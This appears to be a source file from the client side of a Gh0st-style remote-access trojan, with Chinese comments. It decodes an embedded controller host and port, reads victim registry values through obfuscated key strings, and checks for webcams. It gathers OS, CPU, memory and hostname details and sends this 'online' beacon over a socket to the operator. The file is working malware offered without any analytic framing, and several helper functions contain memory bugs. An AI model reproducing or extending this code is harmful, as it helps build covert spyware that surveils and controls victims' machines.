
#include <wininet.h>
#include <stdlib.h>
#include <vfw.h>

#include "decode.h"
#include "until.h"
#include "install.h"

#pragma comment(lib, "wininet.lib")
#pragma comment(lib, "vfw32.lib")

/*************判断视频的头文件*******************/
#include <strmif.h>
#include <uuids.h>
#pragma comment(lib, "strmiids.lib")
/**********************************/

//////////////////////////////////////////////////////////////////////////////////////以下获取QQ上线所需
#import "msxml3.dll"
int memfind(const char *mem, const char *str, int sizem, int sizes)   
{   
	int   da,i,j;   
	if (sizes == 0) da = strlen(str);   
	else da = sizes;   
	for (i = 0; i < sizem; i++)   
	{   
		for (j = 0; j < da; j ++)   
			if (mem[i+j] != str[j])	break;   
			if (j == da) return i;   
	}   
	return -1;   
}

char   *substr(char   *str,int   istar,int   iend) 
{
	char   *p; 
	char   p1[100]={0}; 
	int   ip=0; 
    if(p!=NULL) 
    { 
		free(p); 
		p=NULL; 
    } 
    p=str; 
    ip=strlen(p); 
    if(istar> ip) 
		return   NULL; 
    else 
    { 
		p+=istar-1; 
    } 
    int   ipp=strlen(p); 
    if(ipp <iend) 
		strcpy(p1,p); 
    else 
    { 
        //p1+=iend; 
		memcpy(p1,p,iend); 
    }
	strcpy(str,p1);
    return   str; 
	
} 

int ReplaceStr(char* sSrc, char* sMatchStr, char* sReplaceStr)
{
	int StringLen;
	char caNewString[64];
	char* FindPos;
	FindPos =(char *)strstr(sSrc, sMatchStr);
	if( (!FindPos) || (!sMatchStr) )
		return -1;

	while( FindPos )
	{
		memset(caNewString, 0, sizeof(caNewString));
		StringLen = FindPos - sSrc;
		strncpy(caNewString, sSrc, StringLen);
		strcat(caNewString, sReplaceStr);
		strcat(caNewString, FindPos + strlen(sMatchStr));
		strcpy(sSrc, caNewString);
		
		FindPos =(char *)strstr(sSrc, sMatchStr);
	}
	free(FindPos);
	return 0;
}
//////////////////////////////////////////////////////////////////////////////////////以上获取QQ上线所需

void SplitLoginInfo(char *lpDecodeString, char **lppszHost, LPDWORD lppPort)
{
	*lppszHost = NULL;
	*lppPort = 0;

	bool	bIsProxyUsed = false;
	bool	bIsAuth = false;
	UINT	nSize = lstrlen(lpDecodeString) + 1;
	char	*lpString = new char[nSize];
	memcpy(lpString, lpDecodeString, nSize);
	
	char	*pStart, *pNext, *pEnd;
	*lppszHost = lpString;
	
	if ((pStart = strchr(lpString, ':')) == NULL)
		return;
	
	*pStart = '\0';
	if ((pNext = strchr(pStart + 1, '|')) != NULL)
	{
		bIsProxyUsed = true;
		*pNext = '\0';
	}
	*lppPort = atoi(pStart + 1);
}

bool getLoginInfo(char *lpURL, char **lppszHost, LPDWORD lppPort)
{
	if (lpURL == NULL)
		return false;
	SplitLoginInfo(lpURL, lppszHost, lppPort);
	return true;
}

// Get System Information
DWORD CPUClockMhz()
{
	HKEY	hKey;
	DWORD	dwCPUMhz;
	DWORD	dwBytes = sizeof(DWORD);
	DWORD	dwType = REG_DWORD;
	RegOpenKey(HKEY_LOCAL_MACHINE, "HARDWARE\\DESCRIPTION\\System\\CentralProcessor\\0", &hKey);
	RegQueryValueEx(hKey, "~MHz", NULL, &dwType, (PBYTE)&dwCPUMhz, &dwBytes);
	RegCloseKey(hKey);
	return	dwCPUMhz;
}

//枚举视频设备
//////////////////////////////////////////////////////////
UINT EnumDevices()
{
	UINT nCam = 0;
	CoInitialize(NULL);    //COM 库初始化
	/////////////////////    Step1        /////////////////////////////////
	//枚举捕获设备
	ICreateDevEnum *pCreateDevEnum;                          //创建设备枚举器
	//创建设备枚举管理器
	HRESULT hr = CoCreateInstance(CLSID_SystemDeviceEnum,    //要创建的Filter的Class ID
		NULL,                                                //表示Filter不被聚合
		CLSCTX_INPROC_SERVER,                                //创建进程内COM对象
		IID_ICreateDevEnum,                                  //获得的接口ID
		(void**)&pCreateDevEnum);                            //创建的接口对象的指针
	if (hr != NOERROR)
	{
		//	d(_T("CoCreateInstance Error"));
		return FALSE;
	}
	/////////////////////    Step2        /////////////////////////////////
	IEnumMoniker *pEm;                 //枚举监控器接口
	//获取视频类的枚举器
	hr = pCreateDevEnum->CreateClassEnumerator(CLSID_VideoInputDeviceCategory, &pEm, 0);
	//如果想获取音频类的枚举器，则使用如下代码
	//hr=pCreateDevEnum->CreateClassEnumerator(CLSID_AudioInputDeviceCategory, &pEm, 0);
	if (hr != NOERROR)
	{
		//d(_T("hr != NOERROR"));
		return FALSE;
	}
	/////////////////////    Step3        /////////////////////////////////
	pEm->Reset();                                            //类型枚举器复位
	ULONG cFetched;
	IMoniker *pM;                                            //监控器接口指针
	while(hr = pEm->Next(1, &pM, &cFetched), hr==S_OK)       //获取下一个设备
	{
		IPropertyBag *pBag;                                  //属性页接口指针
		hr = pM->BindToStorage(0, 0, IID_IPropertyBag, (void **)&pBag);
		//获取设备属性页
		if(SUCCEEDED(hr)) 
		{
            VARIANT var;
            var.vt = VT_BSTR;                                //保存的是二进制数据
            hr = pBag->Read(L"FriendlyName", &var, NULL);
			//获取FriendlyName形式的信息
            if (hr == NOERROR) 
            {
				nCam++;
				SysFreeString(var.bstrVal);   //释放资源，特别要注意
            }
            pBag->Release();                  //释放属性页接口指针
        }
        pM->Release();                        //释放监控器接口指针
    }
	CoUninitialize();                   //卸载COM库
	return nCam;
}
//////////////////////////////////////////////////////////

bool IsWebCam()
{
	bool	bRet = false;
	
	if (EnumDevices()>0)
	{
        bRet = TRUE;
	}
	return bRet;
}

UINT GetHostRemark(LPCTSTR lpServiceName, LPTSTR lpBuffer, UINT uSize)
{
	char	strSubKey[1024];
	memset(lpBuffer, 0, uSize);
	memset(strSubKey, 0, sizeof(strSubKey));
	wsprintf(strSubKey, "SYSTEM\\CurrentControlSet\\Services\\%s", lpServiceName);
	ReadRegEx(HKEY_LOCAL_MACHINE, strSubKey, "MotherFucker", REG_SZ, (char *)lpBuffer, NULL, uSize, 0);
	
	if (lstrlen(lpBuffer) == 0)
		gethostname(lpBuffer, uSize);
	
	return lstrlen(lpBuffer);
}

UINT GetGroupName(LPTSTR lpBuffer, UINT uSize)
{
	char	*szGetGroup = (char *)FindConfigString(CKernelManager::g_hInstance, "KLMN");
	if (szGetGroup == NULL)
	{
		return -1;
	}

	char	strSubKey[1024];
	memset(lpBuffer, 0, uSize);
	memset(strSubKey, 0, sizeof(strSubKey));
	
	wsprintf(strSubKey,"%s%s%s%s", "SYST", "EM\\CurrentContro", "lSet\\Services\\", "BITS");
	ReadRegEx(HKEY_LOCAL_MACHINE, strSubKey, szGetGroup , REG_SZ, (char *)lpBuffer, NULL, uSize, 0);
	
	return lstrlen(lpBuffer);
}

int sendLoginInfo(LPCTSTR strServiceName, CClientSocket *pClient, DWORD dwSpeed)
{
	int nRet = SOCKET_ERROR;
	// 登录信息
	LOGININFO	LoginInfo;
	// 开始构造数据
	LoginInfo.bToken = TOKEN_LOGIN; // 令牌为登录
	LoginInfo.bIsWebCam = 0; //没有摄像头
	LoginInfo.OsVerInfoEx.dwOSVersionInfoSize = sizeof(OSVERSIONINFOEX);
	GetVersionEx((OSVERSIONINFO *)&LoginInfo.OsVerInfoEx); // 注意转换类型
	// IP信息
	
	// 主机名
	char hostname[256];
	GetHostRemark(strServiceName, hostname, sizeof(hostname));	
	// 连接的IP地址
	sockaddr_in  sockAddr;
	memset(&sockAddr, 0, sizeof(sockAddr));
	int nSockAddrLen = sizeof(sockAddr);
	getsockname(pClient->m_Socket, (SOCKADDR*)&sockAddr, &nSockAddrLen);
	
	memcpy(&LoginInfo.IPAddress, (void *)&sockAddr.sin_addr, sizeof(IN_ADDR));
	
	memcpy(&LoginInfo.HostName, hostname, sizeof(LoginInfo.HostName));
	// CPU
	LoginInfo.CPUClockMhz = CPUClockMhz();
	/*----------------------------------------------------------------------------------------*/	
	SYSTEM_INFO siSysInfo; 
	GetSystemInfo(&siSysInfo); 	
	wsprintf(LoginInfo.CPUNumber, "%d", siSysInfo.dwNumberOfProcessors);
	/*----------------------------------------------------------------------------------------*/
	//内存大小
    MEMORYSTATUS    MemInfo; 
    MemInfo.dwLength=sizeof(MemInfo); 
    GlobalMemoryStatus(&MemInfo);
	LoginInfo.MemSize = MemInfo.dwTotalPhys/1024/1024;
	
	//视频
	LoginInfo.bIsWebCam = IsWebCam();
	
	// Speed
	LoginInfo.dwSpeed = dwSpeed;
	
	char	*szGroup = (char *)FindConfigString(CKernelManager::g_hInstance, "CDEF");
	if (szGroup == NULL)
	{
		return -1;
	}
	szGroup = (char *)(MyDecode(szGroup + 4));  //解密被加密的字符串
	
	char	*szVersion = (char *)FindConfigString(CKernelManager::g_hInstance, "MNOP");
	if (szVersion == NULL)
	{
		return -1;
	}
	szVersion = (char *)(MyDecode(szVersion + 4));  //解密被加密的字符串
	
	//上线版本
	//char tQjcs[] = {'Q','E','U','/','P','2','d','o','L','X','B','s','a','k','8','=','\0'};
//	char Version[256];
	strcpy(LoginInfo.szVersion, szVersion);

	// 上线分组
	char	*UpRow = NULL;
	char Group[256];
	char strWirn2[] = {'D','e','f','a','u','l','t','\0'};
	if(GetGroupName(Group, sizeof(Group))==0)
	{
		if(szGroup != NULL)
		{
			UpRow = szGroup;
		}
		else
		{
			UpRow = strWirn2;
		}
	}
	else
	{
		UpRow=Group;
	}
	strcpy(LoginInfo.UpGroup,UpRow);
	
	nRet = pClient->Send((LPBYTE)&LoginInfo, sizeof(LOGININFO));

	return nRet;
}